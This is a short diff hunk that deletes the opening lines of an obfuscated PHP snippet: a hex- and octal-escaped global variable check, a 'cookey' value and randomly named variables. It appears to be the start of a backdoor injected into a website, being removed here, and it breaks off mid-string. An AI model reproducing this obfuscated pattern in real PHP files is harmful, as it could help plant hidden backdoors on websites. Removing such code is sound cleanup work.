@@ -1,9 +1,0 @@
-if(!isset($GLOBALS["\x61\156\x75\156\x61"]))
-$sF="PCT4BA6ODSE_";
-$hqrrwlpxhh
-$bmhqhhzolg
-$igeosfpzpy
-$cookey = "ab6b6c56c9";
-$qV="stop_";
-$pjro=22;$vnlpv=$pjro+42;
-$d93="l#
